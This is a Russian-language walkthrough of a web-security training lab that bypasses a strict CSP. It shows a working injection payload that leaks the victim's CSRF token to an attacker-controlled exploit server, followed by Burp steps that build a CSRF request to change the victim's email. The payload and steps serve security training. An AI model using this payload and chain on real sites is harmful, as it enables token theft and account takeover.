В этой лаборатории используется строгий CSP, который блокирует исходящие запросы на внешние веб-сайты.

Чтобы решить лабораторную работу, сначала выполните атаку с использованием межсайтового скриптинга, которая обходит CSP и извлекает CSRF-токен имитируемого пользователя-жертвы с помощью Burp Collaborator. Затем вам нужно изменить адрес электронной почты имитируемого пользователя на hacker@evil-user.net.

Вы должны пометить свой вектор словом «Щелчок», чтобы побудить имитируемого пользователя щелкнуть по нему. Например:

<a href="">Click me</a>
Вы можете войти в свою учетную запись, используя следующие учетные данные:wiener:peter

1. Войдите в лабораторию, используя учетную запись, указанную выше.

2. Проверьте функцию изменения адреса электронной почты. Обратите внимание, что в параметре есть уязвимость XSS email.

3. Перейдите на сервер эксплойтов и добавьте следующий код, заменив YOUR-LAB-IDи YOUR-EXPLOIT-SERVER-IDна идентификатор вашей лаборатории и идентификатор сервера эксплойтов соответственно.

<script>
window.location= "https://YOUR.LAB.URL/my-account?email=%22%3E%3C/form%3E%3Cform%20action=%22https://YOUR.EXPLOIT.URL/exploit%22%3E%3Cbutton%20type=%22Submit%22%3EClick me%3C/button%3E"
</script>

4. Нажмите «Сохранить», а затем «Доставить эксплойт жертве». Если пользователь посещает веб-сайт, содержащий этот вредоносный скрипт, и нажимает ссылку «Нажмите меня», пока он все еще находится в системе на веб-сайте лаборатории, его браузер отправит запрос, содержащий его токен CSRF, на ваш вредоносный веб-сайт.

![image](https://github.com/user-attachments/assets/9e6709fe-b140-4679-9268-e09026ce1c14)


5. Перейдите на экслойт сервере в "Журнал" там будет CSRF токен

![image](https://github.com/user-attachments/assets/c497c3dd-c94f-4096-bb9e-9be456a8090d)

6. Включив функцию перехвата Burp, вернитесь к функции изменения адреса электронной почты в лаборатории и отправьте запрос на изменение адреса электронной почты на любой случайный адрес.

![image](https://github.com/user-attachments/assets/18bbc9c8-5bec-4d99-961b-583c907c4298)

7. В Burp перейдите к перехваченному запросу и измените значение параметра email на любое@любое.любое

8. Щелкните правой кнопкой мыши по запросу и в контекстном меню выберите «Engagement tools», а затем «Generate CSRF PoC». Всплывающее окно показывает как запрос, так и HTML-код CSRF, который он генерирует. В запросе замените токен CSRF на тот, который вы украли у жертвы ранее.

![image](https://github.com/user-attachments/assets/38710d6f-6333-453e-84b7-bd598089eec4)

9. Нажмите «Регенерировать», чтобы обновить CSRF HTML так, чтобы он содержал украденный токен, затем нажмите «Копировать HTML», чтобы сохранить его в буфере обмена.

10. Отмените запрос и отключите функцию перехвата.

11. Вернитесь на сервер эксплойта и вставьте CSRF HTML в тело. Вы можете перезаписать скрипт, который мы ввели ранее.

12. Нажмите «Сохранить» и «Доставить эксплойт жертве». Адрес электронной почты пользователя будет изменен на любое@любое.любое
